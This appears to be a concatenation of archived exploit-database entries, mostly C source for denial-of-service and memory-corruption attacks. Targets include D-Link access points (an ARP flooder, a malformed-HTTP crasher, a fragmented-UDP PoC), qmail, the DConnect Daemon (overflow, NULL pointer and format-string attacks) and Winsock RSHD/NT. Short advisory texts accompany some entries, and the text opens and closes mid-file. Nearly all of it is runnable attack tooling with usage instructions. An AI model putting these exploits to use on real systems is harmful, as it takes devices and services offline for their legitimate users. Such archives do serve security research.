		SSTRNCPY(iface->name, ifr.ifr_name, sizeof(iface->name));
		
		//get l3 addr
		if (ioctl(fd, SIOCGIFADDR, (char*)&ifr) == -1)goto bad;
			
		if (ifr.ifr_ifru.ifru_addr.sa_family == AF_INET) {
			//save addr
			iface->ipaddr=((struct sockaddr_in *)&ifr.ifr_ifru.ifru_addr)->sin_addr.s_addr;
			
			//get netmask
			if(ioctl(fd, SIOCGIFNETMASK, (char*)&ifr) == -1)goto bad;
			iface->netmask=((struct sockaddr_in *)&ifr.ifr_ifru.ifru_netmask)->sin_addr.s_addr;
		 	
		 	//get index
		 	if (ioctl(fd, SIOCGIFINDEX, (char*)&ifr) == -1)goto bad;
		 	iface->index=ifr.ifr_ifindex;
		 	
			//get link-type
			if(ioctl(fd, SIOCGIFHWADDR, (char*)&ifr) == -1)goto bad;
			switch (ifr.ifr_hwaddr.sa_family) {
				//__linux__ encaps loop in eth frames
				case ARPHRD_LOOPBACK:
				case ARPHRD_ETHER:
				case ARPHRD_METRICOM:
					iface->type = DLT_EN10MB;
					iface->l2hdr_size=ETHHDR_SIZE;
					break;
				case ARPHRD_PPP:
				default: 
					goto bad;
			}
		}else goto bad;
		//get MTU
		if(ioctl(fd, SIOCGIFMTU, &ifr) == -1)goto bad;
		iface->mtu=ifr.ifr_mtu;               
	}
	
	close(fd);
	return 1;
	
   bad:
   close(fd);
   printf("%s\n","getting interface infos");
   exit(5);
  }
  
  
int write_link(struct intf *iface,u_char *frame, u_int size){
   int c;
   struct sockaddr_ll sa;
    
	memset(&sa, 0, sizeof (sa));
	
	sa.sll_family    = AF_PACKET;
	sa.sll_ifindex   = iface->index;
	sa.sll_protocol  = htons(ETH_P_ALL);
	
	c = sendto(iface->fd, frame, size, 0, (struct sockaddr *)&sa, sizeof (sa));
	
	if (c != size){
		printf("error writing to bpf,, written:%d bytes\n",c);
		exit(6);
	}
	return (c);
}
 
 

int open_link(char *ifname){
    struct ifreq ifr;
    int n = 1,fd;


    fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (fd == -1){
    	printf("opening link %s",ifname);
    	exit(7);
    }

    memset(&ifr, 0, sizeof (ifr));
    
    SSTRNCPY(ifr.ifr_name,ifname,sizeof (ifr.ifr_name));
    
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0 ){
		printf("%s\n","SIOCGIFHWADDR");
		exit(7);
	}


#ifdef SO_BROADCAST
/*
 * man 7 socket
 *
 * Set or get the broadcast flag. When  enabled,  datagram  sockets
 * receive packets sent to a broadcast address and they are allowed
 * to send packets to a broadcast  address.   This  option  has  no
 * effect on stream-oriented sockets.
 */
    if (setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &n, sizeof(n)) == -1){
    	printf("set sock opt: SO_BROADCAST");
    	exit(7);
    }
    	
#endif  /*  SO_BROADCAST  */

    return fd;


}

 
 
 #endif  //linux
 
 
void adv(){

	printf( "D-LINK DWL-2000AP+ with firmware version 2.11 is prone to two remote denial\n\
of service vulnerability because it fails to handle arp flooding. \n\
The first vuln causes the wireless link (802.11) to be resetted and the arp \n\
table to be rebuilded. All clients connected to the AP are disconnected.\n\
This bug can be triggered by sending lots of arp replies through the wired link\n\
or the radio one at a very high speed.\n\
The second vulnerability affects the wireless link only and are quite harder\n\
to trigger but causes the AP firmware to crash making a manual reboot mandatory.\n\
This bug can be triggered only if no other D-LINK ethernet products are visible \n\
to AP, if wep encryption is enabled and it needs a very large amount of\n\
arp-requests to be broadcasted through its wireless link at a very high speed. \n\
This exploit works in the 90%% of cases because sometimes the AP is able to ban\n\
the flooding client before the exploiting process is complete.\n\
D-LINK doesn't support this product anymore so no solution is available.\n\
Other products can be vulnerable.\n\
\n\
Not vulnerable: DWL-700AP\n\n");


	exit(0);
}
 
void info(char *pname){
	printf( "\nThis program has been written to audit some D-LINK ethernet products\n"
				"cuz it seems that some D-LINK AP will freeze if arp flooded\n\n"
			"At the this time only D-LINK DWL-2000AP+ is reported to be vulnerable so\n"
				"a good idea is to test other products...\n\n"
			"Test 1: it makes the AP to disconnect all connected clients\n"
			"         a quik flood with arp-replies is sufficent to trigger this vuln\n"
			"         %s REPLY en1 @ @ 10.0.0.140 900000 0 00:de:09:a1:bb:c7\n\n"
			"Test 2: it makes the AP firmware to crash making a manual reboot mandatory\n"
			"         a flood with a large amount of arp-requests\n"
			"         %s REQ en1 @ @ 10.0.0.140 9000000 0\n"
			,pname,pname);
			
	exit(0);
}


void usage(char *pname){
	printf( "usage:\n  %s info or advisory \nor\n  %s <REQ/REPLY> <intf> <srcMAC> <srcIP> <queryIP> <nr of pkts> <delay in ms> [<dstMAC>]\n"
			"if srcMAC or srcIP is equal to '@' your own MAC/IP address will be used\n"
			,pname,pname);
	exit(0);

}



main(int argc, char **argv){

 	int pktnr,a,c,ftype,err,delay;
	u_char *srcmac,dstmac[6];
	u_int32_t srcip,dstip;
	char *inv;

	if( argc < 2 )usage(argv[0]);
	if(*argv[1]=='i')info(argv[0]);
	if(*argv[1]=='a')adv();	
	if(argc < (  (!strcmp(argv[1],"REQ")) ? 8 : 9  ) ) usage(argv[0]);
	
	if(!getifinfo(argv[2],&out_intf)){
		printf("error opening interface %s\n",argv[2]);
		exit(2);
	}
	
	

	
	out_intf.fd=open_link(out_intf.name);
	


	printf("ARP FLOODER v0.1  by poplix  -  poplix@papuasia.org  -  2006-12-09\n"
			"written in a very few hours by taking pieces of code from some of mine ancient projects\n\n"
			"\nflooding on %s, ",argv[2]);

	
	if(!strcmp(argv[1],"REQ")){
		printf("flood type: REQ, ");
		ftype=FTYPE_REQ;
	} else {
		printf("flood type: REPLY, ");
		ftype=FTYPE_REPLY;	
	}
	
	if(*argv[3] != '@'){
	  SMALLOC(srcmac,u_char);
	  if(!str_to_macaddr(argv[3],srcmac)){
		printf("\nerror while parsing srcmac: %s\n",argv[3]);
		exit(2);
	  }
	} else
		srcmac=out_intf.l2addr;
		
	printf(" srcMAC: %s, ",macaddr_to_str(srcmac));

	
	if(ftype== FTYPE_REPLY && !str_to_macaddr(argv[8],dstmac)){
		printf("\nerror while parsing dstmac: %s\n",argv[8]);
		exit(2);
	} 
	if(ftype==FTYPE_REPLY) 
		printf("dstMAC: %s, ",argv[8]);
	
	
	if(*argv[4] != '@'){
		ip_to_int(argv[4],&err);
		if(err){
			printf("\nerror while parsing srcip: %s\n",argv[4]);
			exit(2);
		}
	} else
		srcip=out_intf.ipaddr;
	printf("srcIP: %s, ",int_to_ip(srcip));
	
	
	dstip=ip_to_int(argv[5],&err);
	if(err){
		printf("\nerror while parsing dstip: %s\n",argv[5]);
		exit(2);
	} 
	printf("dstIP: %s, ",argv[5]);

	
	
	pktnr=strtoul(argv[6],&inv,10);
	if(*inv != 0){
		printf("\nerror while parsing pkts number: %s\n",argv[6]);
		exit(1);
	}
	printf("pkts: %u, ",pktnr);

	
	delay=(strtoul(argv[7],&inv,10) * 1000);
	if(*inv != 0){
		printf("\nerror while parsing delay: %s\n",argv[6]);
		exit(1);
	}
	printf("delay: %u ms\n",delay/1000);
	printf("\nflooding...\n> 0");
	fflush(stdout);
	
	
 	for(a=0;a<pktnr;a++){
		
 		if( (delay == 0 && (a%2048) == 0) || ( delay >0 && (a%128) == 0)  ){
 			printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b> %u",a);
 			fflush(stdout);
		}
 		if(ftype==FTYPE_REQ)
			arp_request(dstip,srcip,srcmac);
		else
			arp_reply(dstip,dstmac,srcip,srcmac); 
			
		if(delay>0)usleep(delay);
	}

	printf("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b> %u",pktnr);
	printf("\ndone\n");
	close(out_intf.fd);
	exit(0);
}

// milw0rm.com [2006-12-11]
source: http://www.securityfocus.com/bid/16690/info

D-Link DWL-G700AP HTTPD is prone to a remote denial-of-service vulnerability. This issue is due to a failure in the 'httpd' service to properly handle malformed data.

An attacker can exploit this issue to crash the affected webserver, effectively denying service to legitimate users. The affected device must be manually reset to restart the affected service.

This issue is reported to affect firmware versions 2.00 and 2.01; other firmware versions may also be vulnerable.

/*
                 death-link.c
                 ------------------------
                 written by l0om
                                 WWW.EXCLUDED.ORG
                 ------------------------
                 exploit tested on firmware: v2.00 and the latest v2.01
                 remote DoS exploit for the CAMEO-httpd which is running on the D-Link
                 Accesspoint DWL-G700AP. After executing this the accesspoint cannot be
                 configured anymore because the only way to administrate the AP is the
                 administration with your browser. you have to reboot the box to get the
                 httpd started again.

                 have phun!

                 // some greetings
                 maximilian, Prof. J. Dealer, Theldens, Commander Jansen, ole, detach,
                 mattball, molke, murfie, vy99
                 excluded.org people, IT31 people

                 // the guys who made exploiting possible with buying this AP
                 joerres, hermanns, schubert

*/


#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define                  DOSSTRING               "GET \n\n"
#define                  TARGET                          "CAMEO-httpd"
#define                  DESTPORT                80

int alive(char *ip);
int check_httpd(char *ip);
void help(void);
void header(void);
int DoS(char *ip);

int main(int argc, char **argv)
{
                 int fd, i, check = 0;
                 char *ip = NULL;

                 header();

                 if(argc > 1)
                                 for(i = 1; i < argc; i++)
                                                 if(argv[i][0] == '-')
                                                                 switch(argv[i][1]) {
                                                                                 case 'o':
                                                                                                 check = 2;
                                                                                                 break;
                                                                                 case 'c':
                                                                                                 check = 1;
                                                                                                 break;
                                                                                 case 'h':
                                                                                                 help();
                                                                                                 break;
                                                                                 default:
                                                                                                 printf("\t>> %s << unknown option\n",argv[i]);
                                                                                                 exit(-1);
                                                                 }
                                                 else ip = argv[i];

                 if(ip == NULL) help();

                 if(check) {
                                 printf("\tchecking target... "); fflush(stdout);
                                 i = check_httpd(ip);
                                 if(i <= 0) {
                                                 printf("faild! ");
                                                 if(!i) printf("invalid target webserver\n");
                                                 else printf("webserver already dead?\n");
                                                 exit(-1);
                                 }
                                 else printf("done! valid victim detected\n");
                                 if(check == 2) return 0;
                 }

                 printf("\tsending DoS... "); fflush(stdout);
                 if(DoS(ip) <= 0) {
                                 printf("faild!\n");
                                 return -1;
                 } else printf("done!\n");

                 sleep(1);
                 printf("\tchecking webserver status... "); fflush(stdout);
                 if(!alive(ip)) printf("%s DEAD\n",TARGET);
                 else printf("%s on %s is still alive :( \n",TARGET,ip);

                 return 0;
}

int check_httpd(char *ip)
{
                 int sockfd, nbytes, len, i = 0;
                 char buf[500], pattern[] = TARGET, *ptr;
                 struct sockaddr_in servaddr;

                 if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                                 perror("socket");
                                 exit(-1);
                 }
                 servaddr.sin_family = AF_INET;
                 servaddr.sin_port = htons(DESTPORT);
                 servaddr.sin_addr.s_addr = inet_addr(ip);

                 if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
                                 return -1;

                 if(!write(sockfd, "GET / HTTP/1.0\n\n", 16))
                                 return 0;
                 else nbytes = read(sockfd, buf, 500);

                 len = strlen(pattern);
                 ptr = buf;

                 while(nbytes--) {
                                 if(*ptr == pattern[i])
                                                 i++;
                                 else i = 0;
                                 if(i == len) return 1;
                                 else ptr++;
                 }
                 return 0;
}

int alive(char *ip)
{
                 int sockfd, nbytes, len, i = 0;
                 char buf[500], pattern[] = TARGET, *ptr;
                 struct sockaddr_in servaddr;

                 if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                                 perror("socket");
                                 exit(-1);
                 }
                 servaddr.sin_family = AF_INET;
                 servaddr.sin_port = htons(DESTPORT);
                 servaddr.sin_addr.s_addr = inet_addr(ip);

                 if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
                                 return 0;
                 else return 1;
}

int DoS(char *ip)
{
                 int sockfd, nbytes, len, i = 0;
                 char buf[500], pattern[] = TARGET, *ptr;
                 struct sockaddr_in servaddr;

                 if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                                 perror("socket");
                                 exit(-1);
                 }
                 servaddr.sin_family = AF_INET;
                 servaddr.sin_port = htons(DESTPORT);
                 servaddr.sin_addr.s_addr = inet_addr(ip);

                 if(connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1)
                                 return 0;
                 else return(write(sockfd, DOSSTRING, strlen(DOSSTRING)));
}

void help(void)
{
                 printf("\tdeath-link [options] <ip-address>\n");
                 printf("\t-o: ONLY CHECK for valid target\n");
                 printf("\t-c: check for valid target\n");
                 printf("\t-h: help\n");
                 exit(0);
}

void header(void)
{
                 printf("\tdeath-link - written by l0om\n");
                 printf("\t     WWW.EXCLUDED.ORG\n");
                 printf("\tDoS %s D-Link DWL-G700AP\n\n",TARGET);
}/*
 *  
 * Aaron Portnoy
 *  
 * silc.thunkers.net, thunkers
 *  
 * D-Link Wireless Access Point
 * Fragmented UDP DoS Proof of Concept 
 *  
 *
 * gcc -o dlink_dos dlink_dos.c -lnet -Wall 
 *    
 */     
    
#include <libnet.h>
    
#define DEVICE "eth0"
#define SRC_IP "127.0.0.1"
#define DST_IP "127.0.0.1"
#define SRC_PRT 200
#define DST_PRT 11111
    
void usage (char *name)
{   
    fprintf (stderr,
             "Usage: %s -s <source ip> -d <destination ip>\ 
			-a <source port> -b <destination port> \n",
             name);
        
    exit (EXIT_FAILURE);
}
    
int gen_packet (char *device, char *pSRC, char *pDST, u_short sPRT,
                u_short dPRT, int count)
{                           

    libnet_t *l = NULL;
    libnet_ptag_t udp = 0;
    libnet_ptag_t ip = 0;
    
    char errbuf[LIBNET_ERRBUF_SIZE];
    char *payload = NULL;
    u_short payload_s = 0, src_prt, dst_prt;
    u_long src_ip, dst_ip;
    int c, frag;
        
    if (!device)
        device = DEVICE;
        
    l = libnet_init (LIBNET_RAW4, device, errbuf);

    if (!l) {
        fprintf (stderr, "libnet_init() failed: %s\n", errbuf);
        exit (EXIT_FAILURE);
    }
	
    src_ip = pSRC ? libnet_name2addr4 (l, pSRC, LIBNET_RESOLVE) :
        libnet_name2addr4 (l, SRC_IP, LIBNET_RESOLVE);

    dst_ip = pDST ? libnet_name2addr4 (l, pDST, LIBNET_RESOLVE) :
        libnet_name2addr4 (l, DST_IP, LIBNET_RESOLVE);

    src_prt = sPRT ? sPRT : SRC_PRT;

    dst_prt = dPRT ? dPRT : DST_PRT;

    if (count == 1) {
        payload = "\0\0\0\0\0\0\0\0";
        payload_s = 8;
    }

    udp = libnet_build_udp (src_prt,
                            dst_prt,
                            (LIBNET_UDP_H + payload_s) * 2,
                            0, (unsigned char *)payload, payload_s, l, udp);

    if (udp == -1) {
        fprintf (stderr, "Can't build UDP header: %s\n", libnet_geterror (l));
        exit (EXIT_FAILURE);
    }

    switch (count) {

    case 1:
        frag = IP_MF;
        break;

    case 2:
        frag = 0x2002;
        break;

    case 3:
        frag = 0x0003;
        break;
    }

    ip = libnet_build_ipv4 (20,
                            0,
                            1800,
                            frag,
                            128,
                            IPPROTO_UDP, 0, src_ip, dst_ip, NULL, 0, l, ip);

    if (ip == -1) {
        fprintf (stderr, "Can't build IP header: %s\n", libnet_geterror (l));
        exit (EXIT_FAILURE);
    }

    c = libnet_write (l);

    if (c == -1) {
        fprintf (stderr, "Write error: %s\n", libnet_geterror (l));
        exit (EXIT_FAILURE);
    }

    printf ("Wrote UDP packet; check the wire.\n");

    libnet_destroy (l);

    return (EXIT_SUCCESS);

}

int main (int argc, char **argv)
{

    int i;
    char *pDST, *pSRC, *device;
    u_short dPRT = 0;
    u_short sPRT = 0;

    pDST = pSRC = device = NULL;

    while ((i = getopt (argc, argv, "D:d:s:a:b:h")) != EOF) {
        switch (i) {
        case 'D':
            device = optarg;
            break;
        case 'd':
            pDST = optarg;
            break;
        case 's':
            pSRC = optarg;
            break;
        case 'a':
            sPRT = atoi (optarg);
            break;
        case 'b':
            dPRT = atoi (optarg);
            break;
        case 'h':
            usage (argv[0]);
            break;
        }
    }

    printf ("\n----------------------------------\n");
    printf ("      -=    D-Link DoS PoC     =-\n");
    printf ("          Aaron Portnoy\n");
    printf ("       deft () thunkers ! net     \n");
    printf ("   silc.thunkers.net, thunkers\n");
    printf ("----------------------------------\n");


    device ? printf ("\nDevice: \t%s\n", device) :
        printf ("\nDevice: \t%s\n", DEVICE);

    pSRC ? printf ("SRC IP: \t%s\n", pSRC) :
        printf ("SRC IP: \t%s\n", SRC_IP);

    pDST ? printf ("DST IP: \t%s\n", pDST) :
        printf ("DST IP: \t%s\n", DST_IP);

    sPRT ? printf ("SPort: \t\t%d\n", sPRT) :
        printf ("SPort: \t\t%d\n", SRC_PRT);

    dPRT ? printf ("DPort: \t\t%d\n\n", dPRT) :
        printf ("DPort: \t\t%d\n\n", DST_PRT);

    for (i = 1; i <= 3; i++)
        gen_packet (device, pSRC, pDST, sPRT, dPRT, i);
    printf ("\n");

    return (EXIT_SUCCESS);
}

// milw0rm.com [2006-02-14]
source: http://www.securityfocus.com/bid/2237/info
 
qmail is an e-mail server package developed by Dan Bernstein.
 
The qmail smtp server is subject to a denial of service. By specifying a large number of addresses in the recipient field (RCPT), qmail will stop responding.
 
This behaviour is due to the dynamically allocated memory being exhausted.
 
The condition occurs in situations where resource limits are not imposed on the server process.
 
Many systems may be running qmail without resource limits. The existence of working exploit code poses a threat to these vulnerable qmail servers.
 
Once affected, a restart of the qmail smtp service is required in order to gain normal functionality.
 
It should be noted that this type of threat is not limited to qmail. Resource exhaustion attacks can be used against many internet services by remote attackers.

/*
  * qmail-dos-2 - run a qmail system out of swap space by feeding an infinite
  * amount of recipients.
  *
  * Usage: qmail-dos-2 fully-qualified-hostname
  *
  * Author: Wietse Venema. The author is not responsible for abuse of this
  * program. Use at your own risk.
  */
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>

void    fatal(char *fmt,...)
{
    va_list ap;

    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    putc('\n', stderr);
    exit(1);
}

chat(FILE * fp, char *fmt,...)
{
    char    buf[BUFSIZ];
    va_list ap;

    fseek(fp, 0L, SEEK_SET);
    va_start(ap, fmt);
    vfprintf(fp, fmt, ap);
    va_end(ap);
    fputs("\r\n", fp);
    if (fflush(fp))
        fatal("connection lost");
    fseek(fp, 0L, SEEK_SET);
    if (fgets(buf, sizeof(buf), fp) == 0)
        fatal("connection lost");
    if (atoi(buf) / 100 != 2)
        fatal("%s", buf);
}

int     main(int argc, char **argv)
{
    struct sockaddr_in sin;
    struct hostent *hp;
    char    buf[BUFSIZ];
    int     sock;
    FILE   *fp;

    if (argc != 2)
        fatal("usage: %s host", argv[0]);
    if ((hp = gethostbyname(argv[1])) == 0)
        fatal("host %s not found", argv[1]);
    memset((char *) &sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    memcpy((char *) &sin.sin_addr, hp->h_addr, sizeof(sin.sin_addr));
    sin.sin_port = htons(25);
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        fatal("socket: %s", strerror(errno));
    if (connect(sock, (struct sockaddr *) & sin, sizeof(sin)) < 0)
        fatal("connect to %s: %s", argv[1], strerror(errno));
    if ((fp = fdopen(sock, "r+")) == 0)
        fatal("fdopen: %s", strerror(errno));
    if (fgets(buf, sizeof(buf), fp) == 0)
        fatal("connection lost");
    chat(fp, "mail from:<me@me>", fp);
    for (;;)
        chat(fp, "rcpt to:<me@%s>", argv[1]);
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define strnicmp    strncasecmp
#endif



#define VER         "0.1"
#define PORT        411
#define BUFFSZ      8192
#define BOFSZ       400     // total pck size is 10000



void dcsend(int sd, u_char *cmd);
void dcrecv(int sd, u_char *buff, int size);
void delimit(u_char *p);
void show_dc_users(u_char *data, u_char *mynick);
u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u_int   seed;
    int     sd,
            attack,
            i,
            len;
    u_short port = PORT;
    u_char  *buff,
            nick[33],
            dnick[33],
            pass[33],
            key[128];

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "DConnect Daemon <= 0.7.0 and CVS 30 Jul 2006 multiple vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attacks:\n"
            " 1 = listen_thread_udp buffer-overflow\n"
            " 2 = dc_chat NULL pointer\n"
            " 3 = various format string bugs (privileges needed)\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    seed = time(NULL);
    sprintf(nick, "nick%u", ~seed);
    for(i = 0; i < (sizeof(key) - 1); i++) {
        seed = (seed * 0x343FD) + 0x269EC3;
        key[i] = seed;
        if(!key[i]) key[i] = 1;
    }
    key[i] = 0;

    if(attack == 1) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();

        len = sprintf(buff,
            "$SR nickname%0*u filename" "\x05" "3/9",
            BOFSZ,
            seed);

        printf(
            "- send buffer-overflow packet (%d bytes for a buffer of 32)\n"
            "  Note that the min_slots parameter in the server must be enabled\n",
            BOFSZ);
        if(sendto(sd, buff, len, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        goto check;
    }

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    printf("- connect to server: ");
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    printf("ok\n");

    do {
        dcrecv(sd, buff, BUFFSZ);
    } while(strnicmp(buff, "$Lock ", 6));

    if(attack == 2) {
        sprintf(buff, "<%s> message|", nick);
        dcsend(sd, buff);
        goto check;
    }

    sprintf(buff, "$Key %s|", key);
    dcsend(sd, buff);

    if(attack == 3) {
        printf("- insert the nickanme of the superior user or the administrator:\n  ");
        fflush(stdin);
        fgets(nick, sizeof(nick), stdin);
        delimit(nick);

        printf("- insert the required password:\n  ");
        fflush(stdin);
        fgets(pass, sizeof(pass), stdin);
        delimit(pass);
    }

    sprintf(buff, "$ValidateNick %s|", nick);
    dcsend(sd, buff);

    if(attack == 3) {
        sprintf(buff, "$MyPass %s|", pass);
        dcsend(sd, buff);
    }

    do {
        dcrecv(sd, buff, BUFFSZ);
    } while(strnicmp(buff, "$Hello ", 7));

    sprintf(buff, "$MyINFO $ALL %s description$ $Cable" "\x01" "$email$800000000$|", nick);
    dcsend(sd, buff);

    do {
        dcrecv(sd, buff, BUFFSZ);
    } while(strnicmp(buff, "$MyINFO ", 8));

    if(attack == 3) {
        sprintf(buff, "$GetNickList |");
        dcsend(sd, buff);
        do {
            dcrecv(sd, buff, BUFFSZ);
        } while(strnicmp(buff, "$NickList ", 10));

        printf("- insert the nickname of another user from the list below:\n");
        show_dc_users(buff, nick);
        printf("  ");
        fflush(stdin);
        fgets(dnick, sizeof(dnick), stdin);
        delimit(dnick);

        sprintf(buff, "<%s> #msg %s %%n%%n%%n%%n%%n%%n%%n|", nick, dnick);
        dcsend(sd, buff);

//        unfortunately this useful command doesn't work for unknown reasons...
//        sprintf(buff, "<%s> #msg_all %%n%%n%%n%%n%%n%%n%%n|", nick);
//        dcsend(sd, buff);
    }

check:
    sleep(ONESEC);
    close(sd);
    sleep(ONESEC);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    printf("- check server:\n");
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) < 0) {
        printf("\n  Server IS vulnerable!!!\n\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n\n");
    }
    close(sd);
    return(0);
}



void dcsend(int sd, u_char *cmd) {
    int     cmdlen;
    u_char  *p;

    p = strchr(cmd, ' ');
    cmdlen = (p) ? (p - cmd) : (strlen(cmd) - 1);

    if(cmd[0] == '<') {
        printf("- send message\n");
    } else {
        printf("- send %.*s command\n", cmdlen, cmd);
    }
    if(send(sd, cmd, strlen(cmd), 0)
      < 0) std_err();
}



void dcrecv(int sd, u_char *buff, int size) {
    int     t;
    u_char  *p;

    p = buff;
    for(--size; size >= 0; p++, size--) {
        t = recv(sd, p, 1, 0);
        if(t < 0) std_err();
        if(!t) break;
        if(*p == '|') break;
    }
    *p = 0;
    printf(": %s\n", buff);
}



void delimit(u_char *p) {
    while(*p && (*p != '\n') && (*p != '\r')) p++;
    *p = 0;
}



void show_dc_users(u_char *data, u_char *mynick) {
    u_char  *p,
            *l;

    for(p = strchr(data, ' ') + 1; *p; p++) {
        if(*p == '$') continue;
        l = strchr(p, '$');
        if(!l) break;
        *l = 0;
        if(!strcmp(p, mynick)) {
            printf("  %s (this is your nick and you cannot choose it)\n", p);
        } else {
            printf("  %s\n", p);
        }
        p = l;
    }
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/3659/info

Winsock RSHD/NT is a Remote Shell Daemon for Windows NT and Windows 2000. It uses the standard Unix rsh and rcp commands. rsh (ie "remote shell") allows the execution of a non-interactive program on another system running the server component, 'rshd'. The daemon listens for connections coming from an rsh command through TCP/IP, and, on receiving a connection, validates access and executes the specified program.

Upon connecting to the daemon, rsh will supply a port number for the daemon to send standard error data. If the port number specified is invalid, Winsock RSHD/NT will attempt to connect to the invalid port and all port numbers below 1024 (including negative port numbers). Potentially consuming CPU resources and leading to a denial of service.

*
** WRSHDNT 2.20.00 CPU overusage demo
** jimmers@yandex.ru
*/

#define HOST    "localhost"
#define PORT    514

#include <stdio.h>
#include <winsock2.h>

int main(int argc, char * argv[]){
        SOCKET s;
        WSADATA WSAData;
        LPHOSTENT lpHostEnt;
        SOCKADDR_IN sockAddr;
        int res, on = 1;
        char *stderr_port = "-666";
        char *local_user  = "Administrator";
        char *remote_user = "root";
        char *cmd = "help";

        res = WSAStartup( MAKEWORD( 2, 2 ),
&WSAData);
        if(res != 0){
                res = WSAGetLastError();
                printf("WSAStartup() failed,
WSAGetLastError: %d\n", res);
                return 1;
        }

        lpHostEnt = gethostbyname(HOST);
        if(lpHostEnt == NULL){
                res = WSAGetLastError();
                printf("gethostbyname() failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        sockAddr.sin_family     = AF_INET;
        sockAddr.sin_port       = htons(PORT);
        sockAddr.sin_addr       = *((LPIN_ADDR)
*lpHostEnt->h_addr_list);

        res = connect(s, (PSOCKADDR)
&sockAddr, sizeof(sockAddr));
        if(res != 0){
                res = WSAGetLastError();
                printf("connect() failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        Sleep(400);
        res = send(s, stderr_port, strlen
(stderr_port)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(stderr_port) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }

        printf("send(stderr_port): %d\n", res);

        Sleep(400);
        res = send(s, local_user, strlen(local_user)
+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(local_user) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(local_user): %d\n", res);


        Sleep(400);
        res = send(s, remote_user, strlen
(remote_user)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(remote_user) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(remote_user): %d\n", res);


        Sleep(400);
        res = send(s, cmd, strlen(cmd)+1, 0);
        if(res == SOCKET_ERROR){
                res = WSAGetLastError();
                printf("send(cmd) failed,
WSAGetLastError: %d\n", res);
                WSACleanup();
                return 1;
        }
        printf("send(cmd): %d\n", res);

        WSACleanup();
        return 0;
}source: http://www.securityfocus.com/bid/3659/info
 
Winsock RSHD/NT is a Remote Shell Daemon for Windows NT and Windows 2000. It uses the standard Unix rsh and rcp commands. rsh (ie "remote shell") allows the execution of a non-interactive program on another system running the server component, 'rshd'. The daemon listens for connections coming from an rsh command through TCP/IP, and, on receiving a connection, validates access and executes the specified program.
 
Upon connecting to the daemon, rsh will supply a port number for the daemon to send standard error data. If the port number specified is invalid, Winsock RSHD/NT will attempt to connect to the invalid port and all port numbers below 1024 (including negative port numbers). Potentially consuming CPU resources and leading to a denial of service.

/*
** WRSHDNT 2.21.00 CPU overusage demo
** jimmers@yandex.ru
*/

#define HOST    "localhost"
#define PORT    514

#include <stdio.h>
#include <winsock2.h>

int main(int argc, char * argv[]){
        SOCKET s;
        WSADATA WSAData;
